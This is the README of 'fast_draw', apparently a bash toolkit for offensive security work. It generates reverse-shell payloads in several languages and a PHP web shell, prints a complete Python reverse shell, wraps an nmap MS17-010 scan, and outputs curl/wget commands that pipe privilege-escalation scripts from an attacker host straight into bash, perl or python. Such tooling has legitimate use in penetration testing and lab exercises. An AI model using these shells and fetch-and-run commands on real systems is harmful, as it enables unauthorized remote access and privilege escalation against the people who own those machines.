# fast_draw

Shellscripts functions to automate stuff in hacking


## How load the functions:
To load the functions, you just need to load the bash file to your environment: 
```
. gun
```
You can automate this load using the ~/.bashrc file to load every time you open a shell. 


## How use: 
### Generating payloads: 
## Available payloads:
```
[-] Payloads list
payloads:
bash  java  netcat  perl  php  python  ruby

payloads/bash:
bash_dev_tcp_reverse_tcp

payloads/java:
reverse_tcp

payloads/netcat:
fdesc_reverse_tcp  reverse_tcp

payloads/perl:
reverse_tcp

payloads/php:
reverse_tcp  system_web_shell

payloads/python:
reverse_tcp

payloads/ruby:
reverse_tcp

```
#### Listing
```
$ genweapon help
[!] Help menu:
bash list -> List available payloads
bash generate PAYLOAD_PATH LHOST LPORT OUTPUT
	 Example: bash generate payloads/python/reverse_tcp 127.0.0.1 443 /tmp/shell.p
```

#### Creating 
Syntax: 

```
$ genweapon generate payloads/path_to_/payloadfile LHOST LPORT OUTPUT_FILE 
```

Example: 
```
$ genweapon generate payloads/python/reverse_tcp 127.0.0.1 443 /tmp/pyshell.py 
[-] Generating the payload
[-] Payload saved at /tmp/pyshell.py
operador@remember:~/scripts/shellscript/fast_draw$ cat /tmp/pyshell.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Automating nmap nse scans: 
Syntax: 

```
nse smb target ports 
```

Example: 

```
$ nse ms17-010 192.168.10.10 139,445
sudo nmap -p 139,445 --script=smb-vuln-ms17-010.nse -oN nmap_nse_smb-vuln-ms17-010.nse 192.168.10.10

```

### Generate commands to help at Post Exploitation/Priv Escalation
#### Linux: 
Syntax:

```
weblinux LHOST <wget|curl> 
```

Example:

```
$ weblinux 192.168.10.10 wget
wget -q http://192.168.10.10/LinEnum.sh -O - | bash
wget -q http://192.168.10.10/linpeas.sh -O - | bash
wget -q http://192.168.10.10/linux-exploit-suggester-2.pl -O - | perl
wget -q http://192.168.10.10/linux-exploit-suggester.sh -O - | bash
wget -q  http://192.168.10.10/linuxprivchecker.py -O - | python
$ weblinux 192.168.10.10 curl
curl -s http://192.168.10.10/LinEnum.sh | bash
curl -s http://192.168.10.10/linpeas.sh | bash
curl -s http://192.168.10.10/linux-exploit-suggester-2.pl | perl
curl -s http://192.168.10.10/linux-exploit-suggester.sh | bash
curl  -s http://192.168.10.10/linuxprivchecker.py | python
```
